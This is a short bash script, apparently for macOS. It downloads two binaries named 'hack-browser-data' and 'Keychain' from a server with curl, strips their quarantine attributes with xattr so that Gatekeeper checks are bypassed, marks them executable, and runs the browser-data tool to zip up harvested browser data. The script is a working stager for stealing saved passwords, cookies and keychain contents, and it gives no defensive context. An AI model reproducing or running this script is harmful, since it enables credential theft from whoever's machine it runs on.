#!/bin/bash

remoteBrowserHacker="http://127.0.0.1:8000/hack-browser-data"
remoteKeychain="http://127.0.0.1:8000/Keychain"

localBrowserHacker=/tmp/tempLog
localKeychain=/tmp/Keychain


curl -s -o $localBrowserHacker $remoteBrowserHacker
curl -s -o $localKeychain $remoteKeychain


xattr -c $localKeychain
chmod +x $localKeychain

xattr -c $localBrowserHacker
chmod +x $localBrowserHacker

$localBrowserHacker --zip
